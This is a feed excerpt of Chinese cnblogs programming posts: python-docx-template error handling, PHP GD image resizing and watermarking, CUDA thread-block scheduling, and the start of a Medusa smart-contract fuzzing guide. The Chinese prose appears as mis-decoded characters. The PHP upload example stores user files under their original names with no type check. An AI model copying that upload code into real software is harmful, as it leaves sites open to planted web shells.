rt.add(" ä»å³åå·¦æå­", rtl=True) # ä¸­æè®¾ç½®æ ææ

# 12. è¯­è¨è®¾ç½®
rt.add(" English text", lang="en-US")
rt.add(" ä¸­æææ¬", lang="zh-CN")

context = {
    'rich_text_var': rt
}
doc.render(context)
os.makedirs('output',exist_ok=True)
doc.save("output/generated_document.docx")
</code></pre>
<p>å¨æ¨¡æ¿ä¸­åªéç®åå¼ç¨ï¼</p>
<pre><code>{{ rich_text_var }}
</code></pre>
<h2 id="110-éè¯¯ç®¡ç">1.10 éè¯¯ç®¡ç</h2>
<p>TemplateErrorç±»æ¯Jinja2æ¨¡æ¿å¼æä¸­æææ¨¡æ¿ç¸å³å¼å¸¸çåºç±»ï¼å¨python-docx-templateä¸­ä¸é¨ç¨äºæè·æ¨¡æ¿æ¸²æè¿ç¨ä¸­åºç°çåç±»éè¯¯ãå½ä½¿ç¨<code>tpl.render()</code>æ¸²æ Word æ¨¡æ¿æ¶ï¼ä»¥ä¸æåµä¼æåº<code>TemplateError</code>å¼å¸¸ï¼</p>
<ul>
<li>æ¨¡æ¿ä¸­å¼ç¨äºæªä¼ å¥çåéï¼å¦æ¨¡æ¿åäº<code>{{ name }}</code>ï¼ä½<code>render</code>åªä¼ äº<code>test_variable</code>ï¼ï¼</li>
<li>æ¨¡æ¿ä¸­çJinja2è¯­æ³éè¯¯ï¼å¦ç¼ºå°é­åç<code>{% endif %}</code>ãåéå¼ç¨æ ¼å¼éè¯¯ï¼ï¼</li>
<li>æ¨¡æ¿ä¸­ä½¿ç¨äºä¸å­å¨çè¿æ»¤å¨/å½æ°ï¼å¦<code>{{ test_variable | xxx }}</code>ï¼<code>xxx</code>ä¸æ¯ Jinja2 åç½®è¿æ»¤å¨ï¼ã</li>
</ul>
<p>ä»¥ä¸ä»£ç å±ç¤ºäºå¦ä½æµæè·Wordæ¨¡æ¿æ¸²ææ¶çTemplateErrorå¼å¸¸ï¼å¹¶æå°è¯¦ç»çéè¯¯ä¿¡æ¯ï¼</p>
<pre><code class="language-python">from docxtpl import DocxTemplate
from jinja2.exceptions import TemplateError

print("=" * 50)
print("æ­£å¨çææµè¯ç¨çæ¨¡æ¿éè¯¯")
print("." * 50)

try:
    tpl = DocxTemplate("templates/template_error_tpl.docx")
    # å¦ææ¨¡æ¿ä¸­å­å¨è¯­æ³éè¯¯æåéç¼ºå¤±ï¼ä¼è§¦åTemplateErrorå¼å¸¸
    tpl.render({"test_variable": "æµè¯åéå¼"})
# æè·æ¨¡æ¿æ¸²æè¿ç¨ä¸­åºç°çææTemplateErrorå¼å¸¸
except TemplateError as the_error:
    # æå°éè¯¯çåºæ¬æè¿°ä¿¡æ¯
    print(f"æ¨¡æ¿æ¸²æéè¯¯ï¼{str(the_error)}")
    # æ£æ¥å¼å¸¸å¯¹è±¡æ¯å¦åå«docx_contextå±æ§
    if hasattr(the_error, "docx_context"):
        # æå°ä¸ä¸æä¿¡æ¯çæ é¢
        print("éè¯¯ä¸ä¸æè¯¦æï¼")
        # éåå¹¶æå°éè¯¯ä¸ä¸æçæ¯ä¸è¡åå®¹
        for line in the_error.docx_context:
            print(line)
# ç¡®ä¿tplåéå­å¨æ¶åæ§è¡ä¿å­æä½
if 'tpl' in locals():
    # å°æ¸²æåçææ¡£ä¿å­å°æå®è·¯å¾
    tpl.save("output/template_error.docx")
    print(f"ææ¡£å·²ä¿å­è³ï¼output/template_error.docx")
print("." * 50)
print(" æ¨¡æ¿éè¯¯æµè¯å®æ ")
print("=" * 50)
</code></pre>
<h1 id="2-åè">2 åè</h1>
<ul>
<li><a href="https://www.cnblogs.com/luohenyueji/p/19503461" target="_blank">python-docx-templateæ¨¡æ¿åWordææ¡£çææå</a></li>
<li><a href="https://github.com/elapouya/python-docx-template" target="_blank" rel="noopener nofollow">python-docx-template</a></li>
<li><a href="https://docxtpl.readthedocs.io/" target="_blank" rel="noopener nofollow">python-docx-template doc</a></li>
</ul>


</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/luohenyueji/" target="_blank">è½ççå¯å</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/luohenyueji/p/19556736" target="_blank">https://www.cnblogs.com/luohenyueji/p/19556736</a></p>

<div style="text-align:center">
    <img src="https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/wechat/content/%E5%8A%A0%E6%B2%B9%E9%B8%AD.gif">
</div>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-31 09:17">2026-01-31 09:17</span>&nbsp;
<a href="https://www.cnblogs.com/luohenyueji">è½ççå¯å</a>&nbsp;
éè¯»(<span id="post_view_count">7</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19556736);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19556736', targetLink: 'https://www.cnblogs.com/luohenyueji/p/19556736', title: '[python] python-docx-templateå®ç¨æ¡ä¾è§£æ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ç¨ PHP ç©è½¬å¾çï¼ç¼©æ¾ãè£åªãæ°´å°ãæ»¤éä¸ç½æå°½ ]]></title>
    <link>https://www.cnblogs.com/catchadmin/p/19556570</link>
    <guid>42b32b5fee7f1303931c32d4be12da5e</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/catchadmin/p/19556570" title="åå¸äº 2026-01-31 08:40">
    <span role="heading" aria-level="2">ç¨ PHP ç©è½¬å¾çï¼ç¼©æ¾ãè£åªãæ°´å°ãæ»¤éä¸ç½æå°½</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ç¨-php-ç©è½¬å¾çç¼©æ¾è£åªæ°´å°æ»¤éä¸ç½æå°½">ç¨ PHP ç©è½¬å¾çï¼ç¼©æ¾ãè£åªãæ°´å°ãæ»¤éä¸ç½æå°½</h1>
<p>æå° PHP åå¾åï¼ä½ ä¼æ³å°ä»ä¹ï¼å¤§æ¦æ¯ä¸ä¼ ä¸å¼ å¾çå°ç½ç«ï¼ç¶åæ¶å·¥ãä½ PHP å¯ä¸åªæ¯ä¸ªä¸ä¼ å·¥å·ââå®å¨å¾åå¤çæ¹é¢èçä¸å°æ¬äºã</p>
<p>å¾çå¤ªå¤§æ¾ä¸ä¸ç½é¡µï¼éè¦è£æèæ¯éé£ä¸ªä¹±å¥çè·¯äººï¼PHP é½è½æå®ãæ è®ºæ¯ç¼©æ¾ãè£åªãå æ°´å°ï¼è¿æ¯å Instagram é£æ ·å æ»¤éï¼PHP é½è½èä»»ã</p>
<p>è¿ç¯æç« ä¼å¸¦ä½ äºè§£ PHP å¾åå¤ççæ´å¤ç©æ³ãæä»¬ä¼æ·±å¥ GD åºï¼é¡ºä¾¿èè Imagickã</p>
<h2 id="gd-å-imagickä¸¤å¤§å¾åå¤çåº">GD å Imagickï¼ä¸¤å¤§å¾åå¤çåº</h2>
<p>å¨å¨æä¹åï¼åä»ç»ä¸¤ä¸ªæ ¸å¿å·¥å·ï¼GD åºå Imagickã</p>
<h3 id="gd-åºç¨³å®å¯é çèä¼è®¡">GD åºï¼ç¨³å®å¯é çèä¼è®¡</h3>
<p>PHP åç½®ç GD åºæ¯ä¸ªç»å¸éæ©ï¼éåå¤çåºç¡çå¾åæä½ï¼ç¼©æ¾ãè£åªãæ·»å æå­ãå®é»è®¤å°±å¨ PHP éï¼ä¸ç¨é¢å¤å®è£ãè½ç¶ä¸æ¯æç«çï¼ä½å¤ç¨ãç¨³å®ã</p>
<h3 id="imagickåè½æ´å¼ºçæ°éæ©">Imagickï¼åè½æ´å¼ºçæ°éæ©</h3>
<p>Imagick æ¯å¦ä¸ä¸ªå¾åå¤çåºï¼åè½æ´å¼ºå¤§ãå®æé¿å¤çç¢éå¾ãåºç¨ç¹æãæ¯ææ´å¤æ ¼å¼ãå¦æä½ éè¦åå¤æçå¾åå¤çï¼Imagick æ¯æ´å¥½çéæ©ãä¸è¿æ¬æä¸»è¦ç¨ GD åºæ¥æ¼ç¤ºã</p>
<h2 id="åºç¡å¾åä¸ä¼ ">åºç¡ï¼å¾åä¸ä¼ </h2>
<p>å¨å¤çå¾åä¹åï¼å¾åæå®ä¸ä¼ å°æå¡å¨ãä¸é¢æ¯ä¸ä¸ªåºç¡çä¸ä¼ èæ¬ï¼</p>
<pre><code class="language-php">if ($_SERVER['REQUEST_METHOD'] == 'POST' &amp;&amp; isset($_FILES['image'])) {
    $image = $_FILES['image'];
    $uploadDir = 'uploads/';
    $uploadFile = $uploadDir . basename($image['name']);
    
    if (move_uploaded_file($image['tmp_name'], $uploadFile)) {
        echo 'Image uploaded successfully!';
    } else {
        echo 'Failed to upload image.';
    }
}
</code></pre>
<p>è¿æ®µä»£ç æä¸ä¼ çå¾çç§»å¨å°æå®ç®å½ï¼æ¥ä¸æ¥å°±å¯ä»¥å¼å§å¤çäºã</p>
<h2 id="ä½¿ç¨-gd-åºå¤çå¾å">ä½¿ç¨ GD åºå¤çå¾å</h2>
<p>ä¸ä¼ æå®äºï¼ç°å¨è¿å¥æ­£é¢ââå¾åå¤çã</p>
<h3 id="ç¼©æ¾å¾å">ç¼©æ¾å¾å</h3>
<p>å¾çå¤ªå¤§ä¼ææ¢é¡µé¢å è½½éåº¦ãç¨ GD åºå¯ä»¥è½»æ¾ç¼©æ¾ï¼</p>
<pre><code class="language-php">function resizeImage($source, $target, $width, $height) {
    list($originalWidth, $originalHeight) = getimagesize($source);
    $image = imagecreatefromjpeg($source);
    
    $newImage = imagecreatetruecolor($width, $height);
    imagecopyresized($newImage, $image, 0, 0, 0, 0, $width, $height, $originalWidth, $originalHeight);
    
    imagejpeg($newImage, $target);
    imagedestroy($image);
    imagedestroy($newImage);
}
</code></pre>
<p>è¿ä¸ªå½æ°æå¾åç¼©æ¾å°æå®çå®½é«ï¼éåå¨å±ç¤ºåè°æ´å¾çå°ºå¯¸ã</p>
<h3 id="è£åªå¾å">è£åªå¾å</h3>
<p>éè¦è£æå¾ççæä¸ªåºåï¼ç¨ <code>imagecrop()</code> å½æ°ï¼</p>
<pre><code class="language-php">function cropImage($source, $target, $x, $y, $width, $height) {
    list($originalWidth, $originalHeight) = getimagesize($source);
    $image = imagecreatefromjpeg($source);
    
    $croppedImage = imagecrop($image, ['x' =&gt; $x, 'y' =&gt; $y, 'width' =&gt; $width, 'height' =&gt; $height]);
    
    if ($croppedImage !== FALSE) {
        imagejpeg($croppedImage, $target);
        imagedestroy($croppedImage);
    }
    imagedestroy($image);
}
</code></pre>
<p>æå®è£åªåºåçåæ åå°ºå¯¸ï¼PHP ä¼å¸®ä½ å®æå©ä¸çå·¥ä½ã</p>
<h3 id="æ·»å æ°´å°">æ·»å æ°´å°</h3>
<p>å¦æä½ è¿è¥ä¸ä¸ªåè®¸ç¨æ·ä¸ä¼ å¾ççç½ç«ï¼ç»å¾çå æ°´å°å¯ä»¥é²æ­¢çç¨ãä¸é¢æ¯æ·»å æ°´å°çæ¹æ³ï¼</p>
<pre><code class="language-php">function addWatermark($imagePath, $watermarkPath, $targetPath) {
    $image = imagecreatefromjpeg($imagePath);
    $watermark = imagecreatefrompng($watermarkPath);
    
    $imageWidth = imagesx($image);
    $imageHeight = imagesy($image);
    $watermarkWidth = imagesx($watermark);
    $watermarkHeight = imagesy($watermark);
    
    // æ°´å°æ¾å¨å³ä¸è§
    $destX = $imageWidth - $watermarkWidth - 10;
    $destY = $imageHeight - $watermarkHeight - 10;
    
    imagecopy($image, $watermark, $destX, $destY, 0, 0, $watermarkWidth, $watermarkHeight);
    
    imagejpeg($image, $targetPath);
    imagedestroy($image);
    imagedestroy($watermark);
}
</code></pre>
<p>è¿ä¸ªå½æ°æ PNG æ ¼å¼çæ°´å°å å å°å¾çå³ä¸è§ã</p>
<h2 id="è¿é¶æ»¤éåç¼©ç¥å¾">è¿é¶ï¼æ»¤éåç¼©ç¥å¾</h2>
<p>ææ¡äºåºç¡æä½ï¼æ¥ççæ´é«çº§çç©æ³ã</p>
<h3 id="åºç¨æ»¤é">åºç¨æ»¤é</h3>
<p>GD åºæ¯æç»å¾åæ·»å æ»¤éãæ¯å¦æå¾çè½¬æç°åº¦ï¼</p>
<pre><code class="language-php">function applyGrayscale($imagePath, $targetPath) {
    $image = imagecreatefromjpeg($imagePath);
    
    imagefilter($image, IMG_FILTER_GRAYSCALE);
    
    imagejpeg($image, $targetPath);
    imagedestroy($image);
}
</code></pre>
<p>é¤äºç°åº¦ï¼è¿å¯ä»¥è°æ´äº®åº¦ãå¯¹æ¯åº¦ï¼çè³ååç´ åææã</p>
<h3 id="çæç¼©ç¥å¾">çæç¼©ç¥å¾</h3>
<p>å¨å¾çåºæåååè¡¨ä¸­ï¼ç¼©ç¥å¾æ¯å¿ä¸å¯å°çãä¸é¢æ¯çæç¼©ç¥å¾çå½æ°ï¼</p>
<pre><code class="language-php">function createThumbnail($source, $target, $thumbWidth) {
    list($originalWidth, $originalHeight) = getimagesize($source);
    $thumbHeight = ($thumbWidth / $originalWidth) * $originalHeight;
    
    $image = imagecreatefromjpeg($source);
    $thumb = imagecreatetruecolor($thumbWidth, $thumbHeight);
    
    imagecopyresized($thumb, $image, 0, 0, 0, 0, $thumbWidth, $thumbHeight, $originalWidth, $originalHeight);
    
    imagejpeg($thumb, $target);
    imagedestroy($image);
    imagedestroy($thumb);
}
</code></pre>
<p>è¿ä¸ªå½æ°ææå®å®½åº¦çæç¼©ç¥å¾ï¼åæ¶ä¿æåå¾çå®½é«æ¯ã</p>
<h2 id="å¸¸è§é®é¢ææ¥">å¸¸è§é®é¢ææ¥</h2>
<p>å¾åå¤çææ¶ä¼éå°ä¸äºé®é¢ï¼è¿éååºå ä¸ªå¸¸è§çã</p>
<h3 id="å¾åæå">å¾åæå</h3>
<p>å¦æ PHP æ æ³æ­£ç¡®å¤çå¾åæä»¶ï¼å¯è½ä¼å¯¼è´æåãå¤çååç¨ <code>getimagesize()</code> éªè¯æä»¶æ¯å¦ä¸ºææå¾åï¼åæ¶ç¡®è®¤æä»¶æ ¼å¼ï¼JPEGãPNGãGIFï¼ã</p>
<h3 id="åå­ä¸è¶³">åå­ä¸è¶³</h3>
<p>å¤çå¤§å¾çæ¶å¯è½ä¼éå°åå­éå¶ãå¯ä»¥å¨ <code>php.ini</code> ä¸­è°æ´ <code>memory_limit</code>ãå¦ææ¯å±äº«ä¸»æºï¼å¯è½éè¦èç³»æå¡åæåéé¢ã</p>
<h2 id="æ»ç»">æ»ç»</h2>
<p>PHP çå¾åå¤çè½åè¿ä¸æ­¢ä¸ä¼ é£ä¹ç®åãåå© GD å Imagickï¼ä½ å¯ä»¥å®æç¼©æ¾ãè£åªãå æ°´å°ãåºç¨æ»¤éç­æä½ãæ è®ºæ¯æ­å»ºå¾çåºãå¤çç¨æ·ä¸ä¼ çåå®¹ï¼è¿æ¯ä¼åç½ç«å¾çï¼è¿äºæè½é½è½æ´¾ä¸ç¨åºã<br>
<a href="https://catchadmin.com/post/2026-01/openclaw-installed" target="_blank" rel="noopener nofollow">ç¨ PHP ç©è½¬å¾çï¼ç¼©æ¾ãè£åªãæ°´å°ãæ»¤éä¸ç½æå°½</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-31 08:41">2026-01-31 08:40</span>&nbsp;
<a href="https://www.cnblogs.com/catchadmin">JaguarJack</a>&nbsp;
éè¯»(<span id="post_view_count">21</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19556570);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19556570', targetLink: 'https://www.cnblogs.com/catchadmin/p/19556570', title: 'ç¨ PHP ç©è½¬å¾çï¼ç¼©æ¾ãè£åªãæ°´å°ãæ»¤éä¸ç½æå°½' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ CUDAæ¯å¦ä½è°åº¦Thread Blockçï¼ ]]></title>
    <link>https://www.cnblogs.com/DemoFX/p/19556140</link>
    <guid>3ee394b0098d093b40f864db148b2b59</guid>
    <description>
    <![CDATA[ 
	<div class="postTitle">
		<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DemoFX/p/19556140" title="åå¸äº 2026-01-31 00:25">
    <span role="heading" aria-level="2">CUDAæ¯å¦ä½è°åº¦Thread Blockçï¼</span>
    

</a>

	</div>
	    <div id="cnblogs_post_description" style="display: none">
        
        cuda
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>æè¿å¨çCUDA,è®²å°C++æ¯æä¹è°ç¨CUDAå½æ°è¿èå è½½è¿GPUåæ ¸è¿è¡è¿è¡çï¼ç½ä¸åºæ¬ä¸å¨é¨é½æ¯ä¸æ ·çèµæï¼åªè®²Gridåå«å¾å¤Thread block,æ¯ä¸ªThread blockåªè½å è½½å°ä¸ä¸ªSMä¸­è¿è¡å¹¶è¡è¿ç®ï¼ç¶åå°±æ¯çº¿ç¨åç±»å°warpä¸­è¿è¡åç»è®¡ç®ï¼ç½ä¸å¤§å¤è®²çæ¯è¿äºï¼å·ä½thread blockæä¹åéå°SMå°±æ²¡è®²æ¸æ¥ï¼ä»å¤©æ¥ç¹èªå·±çåæã</p>
<p><img alt="block1" width="298" height="153" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3730441/202601/3730441-20260131002139596-1843603281.jpg" class="lazyload"></p>
<p>æ¾å¡çç¡¬ä»¶éç½®ï¼åªæ3ä¸ªSMååï¼æ»å±åªæ12ä¸ªç¡¬ä»¶warpï¼ä½æ¯è¿è¡è½¯ä»¶è°è¯åç°ï¼è³å°æä¸ç¾å¤ä¸ªè½¯ä»¶warpåæ¶è¿è¡ï¼å¦ææç§æ¯ä¸ªThread Blockåªéç½®å°ä¸ä¸ªSMæ¥è®¡ç®ï¼æ»å±åºè¯¥åªæ12ä¸ªè½¯ä»¶warpæå¯¹ï¼å¤åºæ¥çwarpåªæ¥çï¼å¶å®è¿åªæ¯ä¸ç§è½¯ä»¶æ¨¡æå®ç°çâå¹¶è¡"è®¡ç®ï¼ç¨æ¯ç¡¬ä»¶æ°ç®å¤çè½¯ä»¶warpæé«ç¡¬ä»¶çè®¡ç®ååéï¼å¦ä¸æ¹é¢ï¼ä¸ä¸ªSMå¯ä»¥åæ¶æ¯æå¤ä¸ªThread blockçè¿è¡ï¼è¿æ¯å¾å¤ææ¡£é½æ²¡æä»ç»çåå®¹ï¼ä¹æ¯æ¬æçéç¹ã</p>
<p><img alt="code" width="419" height="291" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3730441/202601/3730441-20260131002215050-59211704.jpg" class="lazyload"></p>
<p>é¦åçä»£ç ï¼ä»£ç å¾ç®åï¼åªæ¯ä¸ªæ®éçkernelå½æ°ãä¸é¢çåæç¨å°Cuda Toolkitéé¢èªå¸¦çprofileå·¥å·nvvp.<br>
é¦åå¨hostç«¯è°ç¨ä¸è¿°ä»£ç ï¼<br>
mykernelfunc &lt;&lt;&lt; 2, 1&gt;&gt;&gt; ();ç¨nvvpæ¥çå¦ä¸å¾æç¤ºï¼</p>
<p><img alt="1" width="401" height="201" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3730441/202601/3730441-20260131002236466-73501573.jpg" class="lazyload"></p>
<p>ä¸å±å°±3ä¸ªSM,ä¸¤ä¸ªThread blockç¨äºä¸¤ä¸ªï¼è¯´æThread blockå¨åéSMçæ¶åæ¯é¦åæéç©ºä½çSMæ¥è¿è¡ï¼å¹¶æ²¡æä¸¤ä¸ªThread blockè¿è¡å°ä¸ä¸ªSMçæåµã<br>
mykernelfunc &lt;&lt;&lt; 4, 1&gt;&gt;&gt; ();è¿ä¸ªæ4ä¸ªThread blockï¼æ¾ç¶3ä¸ªSMä¸å¤åï¼è¯å®å¤åºæ¥ä¸ä¸ªã</p>
<p><img alt="2" width="418" height="200" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3730441/202601/3730441-20260131002300722-875833623.jpg" class="lazyload"><br>
<img alt="3" width="424" height="94" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3730441/202601/3730441-20260131002321092-1920457245.jpg" class="lazyload"></p>
<p>ä»ä¸å¾è½çåºæ¥ï¼ä¸ä¸ªSMå·²ç»å¨é¨è¢«å ç¨äºï¼å¹³åä¸æ¥æ¯ä¸ªSMæ1.33ä¸ªwarp,è¯´æå¤åºæ¥çé£ä¸ªwarp,å·²ç»è¢«åéè¿æä¸ªSMéé¢ã<br>
è¿ä¸ªå4ä¸ªthread blockåå°3ä¸ªSMï¼ä¸å¥½åï¼æä»¬æ¢ä¸ªï¼<br>
mykernelfunc &lt;&lt;&lt; 96, 64&gt;&gt;&gt; ();</p>
<p><img alt="6" width="420" height="99" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3730441/202601/3730441-20260131002403012-1270887631.jpg" class="lazyload"></p>
<p>è¿éåäº96ä¸ªthread block,åå°3ä¸ªSMéï¼æ¯ä¸ä¸ªå¯ä»¥åå°32ä¸ªï¼64è¡¨ç¤º64ä¸ªçº¿ç¨ï¼è¿æ ·ä¸å±æ¯64ä¸ªwarp,å·²ç»è¾¾å°ç¡¬ä»¶æéäºï¼çè®ºä¸è¾¾å°100%çç¡¬ä»¶å ç¨çï¼å®éæµè¯è¾¾å°99.5%çOccupancy.<br>
ä½æ¯å¦æä½¿ç¨äºshared memory,æåµå°±ä¼æå¾å¤§çä¸åã</p>
<p><img alt="7" width="425" height="171" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3730441/202601/3730441-20260131002432159-1807947204.jpg" class="lazyload"></p>
<p>è¿éåéäº24kçå±äº«åå­ï¼ä½å®éçwarpå°±éå°äº24ä¸ªã</p>
<p><img alt="10" width="800" height="430" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3730441/202601/3730441-20260131002502807-1258483125.jpg" class="lazyload"></p>
<p>ä»ç»çä¸é¢å³äºGPU utilityçè¯´æï¼è¿éå¶å®æ¯å³é®æå¨ï¼kernelä»£ç ä½¿ç¨äº24kçshared memory,èæ¯ä¸ªSMçæå¤§shared memoryæ¯96k,æ­£å¥½æ¯4åï¼èè¿è¡çThread blockæ°ç®ä¹æ¯4ä¸ªï¼è¿è¯´æä»ä¹ï¼è¿è¯´æï¼Thread blockå¨åéSMçæ¶åï¼é¦ååèkernelä¸­ä½¿ç¨çshared memoryçå¤§å°ï¼æ´ä¸ªSMçshared memoryè½è£ä¸å ä¸ªkernelçshared memoryå°±ä½¿ç¨å ä¸ªThread block,è¿å¶å®æ¯make senseçï¼å ä¸ºkernelå ç¨çshared memoryå±äºç¡¬ä»¶è¦æ±ï¼ä¸æ»¡è¶³èªç¶æ æ³è¿è¡ã</p>


</div>
<div class="clear"></div>

	<div class="postDesc">posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-31 00:26">2026-01-31 00:25</span>&nbsp;
<a href="https://www.cnblogs.com/DemoFX">demofx</a>&nbsp;
éè¯»(<span id="post_view_count">24</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19556140);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19556140', targetLink: 'https://www.cnblogs.com/DemoFX/p/19556140', title: 'CUDAæ¯å¦ä½è°åº¦Thread Blockçï¼' })">ä¸¾æ¥</a>
</div>
 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Medusa - æºè½åçº¦ Fuzzing å·¥å·ä»ç»ä¸æ¡ä¾è®²è§£ ]]></title>
    <link>https://www.cnblogs.com/ACaiGarden/p/19556121</link>
    <guid>580ed21e99bebfab3e6ffa30616203b3</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ACaiGarden/p/19556121" title="åå¸äº 2026-01-31 00:04">
    <span role="heading" aria-level="2">Medusa - æºè½åçº¦ Fuzzing å·¥å·ä»ç»ä¸æ¡ä¾è®²è§£</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="èæ¯">èæ¯</h1>
<p>Fuzzï¼æ¨¡ç³æµè¯ï¼æ¯ä¸ç§éè¿èªå¨çæå¤§ééæºæåéæºè¾å¥æ¥æµè¯ç¨åºï¼ä»¥åç°æå¤è¡ä¸ºãå´©æºææ¼æ´çè½¯ä»¶æµè¯ææ¯ã<br>
Medusa æ¯ç± Trail of Bits å¼åçå¼æºæºè½åçº¦æ¨¡ç³æµè¯å·¥å·ï¼åºäº go-ethereum æå»ºï¼çµææ¥æºäºå¶åèº« Echidnaãå®ä¸é¨ç¨äºæ£æµ Solidity æºè½åçº¦ä¸­çæ¼æ´åé»è¾éè¯¯ã<br>
Medusa çæ ¸å¿å·¥ä½åçæ¯ï¼å¼åèå®ä¹ä¸ç»ä¸åéï¼å³å¨ä»»ä½æåµä¸é½åºä¿æä¸ºççæ¡ä»¶ï¼ï¼å·¥å·ä¼èªå¨çæå¤§ééæºäº¤æåºåå°è¯è¿åè¿äºä¸åéãä¸æ¦æä¸ªäº¤æåºåå¯¼è´ä¸åéè¿å falseï¼å³è¡¨æåç°äºæ½å¨æ¼æ´ã<br>
Medusa è¿æ¯æé¾ä¸åçº¦ fork æµè¯ãHTML è¦ççæ¥åçæç­åè½ï¼éç¨äºä»å¼åé¶æ®µçå®å¨æµè¯å°ä¸ä¸å®¡è®¡çåç±»åºæ¯ã</p>
<ul>
<li>Githubï¼<a href="https://github.com/crytic/medusa" target="_blank" rel="noopener nofollow">https://github.com/crytic/medusa</a></li>
<li>Docsï¼<a href="https://github.com/crytic/medusa/blob/master/docs/src/SUMMARY.md" target="_blank" rel="noopener nofollow">https://github.com/crytic/medusa/blob/master/docs/src/SUMMARY.md</a></li>
</ul>
<h1 id="é¨ç½²ä¸ä½¿ç¨">é¨ç½²ä¸ä½¿ç¨</h1>
<p>æ¥ä¸æ¥ç´æ¥è¿å¥æ­£é¢ï¼å¦ä½å®è£ãéç½®ä»¥åä½¿ç¨ Medusa</p>
<h2 id="å®è£">å®è£</h2>
<p>è¿è¡ä»¥ä¸çå½ä»¤å®è£ medusa çææ°çæ¬ï¼</p>
<pre><code>go install github.com/crytic/medusa@latest
</code></pre>
<h2 id="åçº¦é¡¹ç®åå»º">åçº¦é¡¹ç®åå»º</h2>
<p>é¦ååå»ºä¸ä¸ª foundry é¡¹ç®ï¼å°éè¦ fuzz çä»£ç æ¾å°è¯¥é¡¹ç®ä¸­ï¼å®æç¸å³çéç½®ï¼ç¡®ä¿è½å¤æå buildã</p>
<blockquote>
<p>foundry å¼åæ¡æ¶ï¼<a href="https://getfoundry.sh/" target="_blank" rel="noopener nofollow">https://getfoundry.sh/</a></p>
</blockquote>
<h2 id="medusa-åå»ºä¸éç½®">Medusa åå»ºä¸éç½®</h2>
<p>å¨ foundry é¡¹ç®è·¯å¾ä¸æ§è¡ <code>medusa init</code> å½ä»¤ï¼å°ä¼å¨ç®å½ä¸åå»ºä¸ä¸ª <code>medusa.json</code> æä»¶ï¼è¿æ¯ fuzz çéç½®æä»¶ã<br>
å¶ä¸­æä¸äºå³é®çéç½®é¡¹ï¼</p>
<pre><code>1. targetContractsï¼è¦ fuzz çåçº¦åç§°ï¼åç»­ä¼ç¼åå¯¹åºç Fuzz åçº¦ï¼
2. Fork éç½®ï¼
	- forkModeEnabled: å¼å¯ fork æ¨¡å¼
	- rpcUrl: é¾ç RPC èç¹
	- rpcBlock: fork çåºåé«åº¦
3. cheatCodesï¼å¯ä»¥éç¨é¨åç foundry cheat codeï¼ä¸ä½¿ç¨æ¹æ³æç§ medusa ææ¡£æä¾çæ¹å¼ä½¿ç¨ã
4. æ§è½éç½®ï¼
  1. workersï¼åæ¶å·¥ä½çæ ¸å¿æ°
  2. callSequenceLengthï¼åæ¬¡è°ç¨åºåæå¤§é¿åº¦ï¼ä¸æ¬¡è°ç¨æå¤å¯ä»¥æ§è¡å¤å°ä¸ªå½æ°ï¼
  3. timeoutï¼è¿è¡æ¶é´
</code></pre>
<p>å¨éç½®å®æåï¼å¯ä»¥æ§è¡ä»¥ä¸ä»£ç å¼å§ fuzzï¼å¶ä¸­ <code>--config</code> åæ°æ¯ææå®éç½®æä»¶ï¼ä¸æå®é»è®¤ä¸º <code>medusa.json</code> æä»¶ã</p>
<pre><code>medusa fuzz --config medusa.onchain.json
</code></pre>
<h1 id="fuzz-å½æ°ç¼å">Fuzz å½æ°ç¼å</h1>
<h2 id="å½æ°ä»ç»">å½æ°ä»ç»</h2>
<p>ä½¿ç¨ Medusa å¯¹åçº¦è¿è¡ fuzz éè¦ç¼åä¸¤ç§å½æ°ï¼</p>
<ul>
<li>å¬å±å½æ°ï¼<code>external</code> æ <code>public</code> ç±»åçå½æ°ã</li>
